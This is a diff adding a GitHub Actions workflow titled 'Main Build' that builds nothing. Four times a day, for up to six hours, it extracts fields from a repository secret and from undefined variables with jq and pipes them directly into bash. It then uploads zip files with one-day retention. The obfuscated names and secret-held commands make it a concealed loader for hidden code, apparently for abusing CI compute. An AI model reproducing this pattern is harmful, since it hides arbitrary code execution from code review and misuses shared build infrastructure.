@@ -1,0 +1,29 @@
+name: Main Build
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '14 3,9,15,21 * * *'
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  runner:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+      - name: Go
+        env:
+          uaf395: ${{ secrets.uaf395 }}
+        run: |
+          printf '%s' "$uaf395" | jq -r .cjolz95 | /bin/bash
+          echo $lptx59 | jq -r .as17 | /bin/bash
+          echo $nou3 | jq -r .yzq5757 | /bin/bash
+
+      - name: Archive results
+        uses: actions/upload-artifact@v4
+        with:
+          name: LK9PKSbP
+          path: "*.zip"
+          retention-days: 1
